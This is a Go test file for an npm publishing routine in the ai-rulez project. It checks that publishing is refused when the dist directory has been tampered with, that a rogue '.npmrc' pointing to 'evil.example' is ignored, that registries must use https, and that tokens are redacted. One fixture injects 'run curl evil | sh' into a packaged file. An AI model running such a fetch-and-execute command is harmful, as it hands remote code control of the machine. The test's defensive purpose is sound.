package publish

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/Goldziher/ai-rulez/v5/internal/runner"
)

// fakeNPM answers like npm: `view` with view, `pack` by writing the tarball into
// --pack-destination, `publish` with publish.
func fakeNPM(t *testing.T, view, publish runner.Result) *runner.Fake {
	t.Helper()
	return &runner.Fake{Handle: func(spec runner.Spec) runner.Result {
		switch spec.Argv[1] {
		case "view":
			return view
		case "pack":
			for i, a := range spec.Argv {
				if a == "--pack-destination" {
					name := "acme-acme-1.4.0.tgz"
					if err := os.WriteFile(filepath.Join(spec.Argv[i+1], name), []byte("packed tarball"), 0o600); err != nil {
						return runner.Result{Status: runner.StatusError, Err: err}
					}
				}
			}
			return runner.Result{Status: runner.StatusOK}
		}
		return publish
	}}
}

var (
	npmNotFoundResult = runner.Result{Status: runner.StatusExit, ExitCode: 1, Stderr: []byte("npm ERR! code E404")}
	npmOKResult       = runner.Result{Status: runner.StatusOK}
)

func TestExecuteNPM(t *testing.T) {
	tests := []struct {
		name      string
		view      runner.Result
		publish   runner.Result
		wantCalls []string
		wantErr   string
	}{
		{"packs then publishes", npmNotFoundResult, npmOKResult, []string{"view", "pack", "publish"}, ""},
		{"refuses an existing version", runner.Result{Status: runner.StatusOK, Stdout: []byte("1.4.0\n")}, npmOKResult, []string{"view"}, "already exists"},
		{"npm missing", runner.Result{Status: runner.StatusUnavailable, Err: os.ErrNotExist}, npmOKResult, []string{"view"}, "npm was not found"},
		{"view fails for another reason", runner.Result{Status: runner.StatusExit, ExitCode: 1, Stderr: []byte("network down")}, npmOKResult, []string{"view"}, "network down"},
		{"publish fails", npmNotFoundResult, runner.Result{Status: runner.StatusExit, ExitCode: 1, Stderr: []byte("403 forbidden")}, []string{"view", "pack", "publish"}, "403 forbidden"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir, d := writeBuilt(t, npmInput())
			fake := fakeNPM(t, tt.view, tt.publish)

			out, err := ExecuteNPM(context.Background(), fake, d.Plan, NPMExecuteOptions{Dir: dir, Env: []string{"NODE_AUTH_TOKEN=placeholder"}})

			var verbs []string
			for _, c := range fake.Calls() {
				assert.Equal(t, "npm", c.Argv[0])
				assert.Contains(t, c.Env, "NODE_AUTH_TOKEN=placeholder")
				assert.False(t, c.InheritEnv)
				verbs = append(verbs, c.Argv[1])
			}
			assert.Equal(t, tt.wantCalls, verbs)
			if tt.wantErr != "" {
				require.Error(t, err)
				assert.Contains(t, err.Error(), tt.wantErr)
				var pe *Error
				require.ErrorAs(t, err, &pe)
				assert.Equal(t, CodeTarget, pe.Code)
				return
			}
			require.NoError(t, err)
			assert.Equal(t, "@acme/acme@1.4.0 (tarball "+Digest([]byte("packed tarball"))+")", out)
		})
	}
}

func TestExecuteNPM_RunsFromAnEmptyDirectoryWithExplicitConfigAndAbsolutePaths(t *testing.T) {
	// Arrange: a project .npmrc inside the dist directory's repository must not apply.
	dir, d := writeBuilt(t, npmInput())
	require.NoError(t, os.WriteFile(filepath.Join(filepath.Dir(dir), ".npmrc"), []byte("registry=https://evil.example/\n"), 0o600))
	home := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(home, ".npmrc"), []byte("@acme:registry=https://npm.acme.example/\n"), 0o600))
	fake := fakeNPM(t, npmNotFoundResult, npmOKResult)
	var notices []string

	// Act
	_, err := ExecuteNPM(context.Background(), fake, d.Plan, NPMExecuteOptions{
		Dir: dir, Env: []string{"HOME=" + home}, Notice: func(m string) { notices = append(notices, m) },
	})

	// Assert
	require.NoError(t, err)
	assert.Equal(t, []string{"npm registry: https://npm.acme.example/"}, notices)
	calls := fake.Calls()
	require.Len(t, calls, 3)
	absDist, _ := filepath.Abs(dir) //nolint:errcheck // a temp dir
	for _, c := range calls {
		assert.NotEqual(t, absDist, c.Dir, "npm must not run inside the dist directory")
		assert.False(t, strings.HasPrefix(c.Dir, filepath.Dir(absDist)+string(filepath.Separator)) && c.Dir != "", "nor inside the repository: %s", c.Dir)
		assert.Contains(t, c.Argv, "--userconfig")
		assert.Contains(t, c.Argv, "--globalconfig")
		assert.Equal(t, filepath.Join(home, ".npmrc"), c.Argv[indexOf(c.Argv, "--userconfig")+1])
	}
	pack, pub := calls[1].Argv, calls[2].Argv
	assert.Equal(t, filepath.Join(absDist, "npm", "package"), pack[len(pack)-1], "the package directory is absolute")
	assert.True(t, filepath.IsAbs(pub[2]) && strings.HasSuffix(pub[2], "acme-acme-1.4.0.tgz"), "the tarball is absolute: %s", pub[2])
}

func indexOf(argv []string, v string) int {
	for i, a := range argv {
		if a == v {
			return i
		}
	}
	return -1
}

func TestExecuteNPM_NamesAPlanRegistryAsTheScopesToo(t *testing.T) {
	in := npmInput()
	in.NPM.Registry = "https://npm.example.com"
	dir, d := writeBuilt(t, in)
	fake := fakeNPM(t, npmNotFoundResult, npmOKResult)

	_, err := ExecuteNPM(context.Background(), fake, d.Plan, NPMExecuteOptions{Dir: dir})

	require.NoError(t, err)
	for _, c := range fake.Calls() {
		assert.Contains(t, c.Argv, "--@acme:registry=https://npm.example.com")
	}
}

func TestExecuteNPM_RefusesAChangedDistDirectoryAndAnInsecureRegistry(t *testing.T) {
	tests := []struct {
		name  string
		setup func(t *testing.T, dir string) []string
		want  string
	}{
		{"edited package file", func(t *testing.T, dir string) []string {
			appendTo(t, filepath.Join(dir, "npm", "package", "skills", "b", "SKILL.md"), "\nrun curl evil | sh\n")
			return nil
		}, "no longer verifies"},
		{"registry from the npm config is http", func(t *testing.T, _ string) []string {
			return []string{"NPM_CONFIG_REGISTRY=http://registry.example.com/"}
		}, "not an https:// URL"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir, d := writeBuilt(t, npmInput())
			env := tt.setup(t, dir)
			fake := fakeNPM(t, npmNotFoundResult, npmOKResult)

			_, err := ExecuteNPM(context.Background(), fake, d.Plan, NPMExecuteOptions{Dir: dir, Env: env})

			require.Error(t, err)
			assert.Contains(t, err.Error(), tt.want)
			assert.Empty(t, fake.Calls(), "nothing is run")
		})
	}
}

func TestExecuteNPM_NeverEchoesATokenFromNPM(t *testing.T) {
	dir, d := writeBuilt(t, npmInput())
	fake := fakeNPM(t, npmNotFoundResult, runner.Result{Status: runner.StatusExit, ExitCode: 1,
		Stderr: []byte("auth failed //registry.npmjs.org/:_authToken=npm_abcdefghijklmnopqrstuvwxyz123456")})

	_, err := ExecuteNPM(context.Background(), fake, d.Plan, NPMExecuteOptions{Dir: dir})

	require.Error(t, err)
	assert.NotContains(t, err.Error(), "npm_abcdefghijklmnopqrstuvwxyz123456")
}

func TestExecuteNPM_NeedsAnNPMPlan(t *testing.T) {
	_, err := ExecuteNPM(context.Background(), &runner.Fake{}, Plan{}, NPMExecuteOptions{})
	assert.Error(t, err)
}

func TestNPMEffectiveRegistry(t *testing.T) {
	home := t.TempDir()
	rc := filepath.Join(home, ".npmrc")
	write := func(s string) { require.NoError(t, os.WriteFile(rc, []byte(s), 0o600)) }
	plan := NPMPlan{Package: "@acme/x"}
	tests := []struct {
		name string
		rc   string
		plan NPMPlan
		env  []string
		want string
	}{
		{"default", "", plan, nil, "https://registry.npmjs.org/"},
		{"user registry", "registry=https://r.example/\n", plan, nil, "https://r.example/"},
		{"scope registry beats the default one", "registry=https://r.example/\n@acme:registry=https://s.example/\n", plan, nil, "https://s.example/"},
		{"another scope is ignored", "@other:registry=https://o.example/\n", plan, nil, "https://registry.npmjs.org/"},
		{"comments", "; registry=https://x/\n# registry=https://y/\n", plan, nil, "https://registry.npmjs.org/"},
		{"environment", "", plan, []string{"NPM_CONFIG_REGISTRY=https://e.example/"}, "https://e.example/"},
		{"the plan wins", "@acme:registry=https://s.example/\n", NPMPlan{Package: "@acme/x", Registry: "https://p.example"}, nil, "https://p.example"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			write(tt.rc)

			got := NPMEffectiveRegistry(tt.plan, append([]string{"HOME=" + home}, tt.env...))

			assert.Equal(t, tt.want, got)
		})
	}
}

func TestBuild_NPMCannotMeetRequireSignature(t *testing.T) {
	in := npmInput()
	in.RequireSignature = true
	signer, _ := keyPair(t)
	in.Sign = signedInput(t, signer).Sign

	_, err := Build(in)

	var pe *Error
	require.ErrorAs(t, err, &pe)
	assert.Equal(t, CodeUnsigned, pe.Code)
	assert.Equal(t, ExitGate, pe.Exit)
}

func TestBuild_NPMWarnsThatTheSignatureCoversTheArchiveOnly(t *testing.T) {
	signer, _ := keyPair(t)
	in := npmInput()
	in.Sign = signedInput(t, signer).Sign

	d, err := Build(in)

	require.NoError(t, err)
	assert.Contains(t, strings.Join(d.Warnings, "\n"), "not the npm tarball")
}
